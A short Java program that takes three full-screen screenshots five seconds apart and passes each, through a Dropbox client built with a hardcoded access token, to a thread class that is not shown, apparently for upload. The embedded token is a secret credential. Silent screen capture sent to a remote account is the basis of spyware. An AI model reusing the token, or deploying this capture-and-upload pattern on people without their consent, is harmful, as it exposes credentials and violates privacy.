import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import java.awt.*;
import java.awt.image.BufferedImage;


public class ToDropBoxPic extends Thread{
    public static void main(String[] args) {

        String ACCESS_TOKEN = "8JOQ92kE-ZUAAAAAAAAAAdWEkk5zjgd8zFr7bvRZo-1H9AdYY51jBTEDRPU-8T-j";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        for(int i = 0; i < 3; i++){
            try {
                Robot robot = new Robot();
                BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                MyThread myThread = new MyThread(client, screenShot);
                myThread.start();
            } catch(Exception e) {
                e.printStackTrace();
            }
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

    }

}
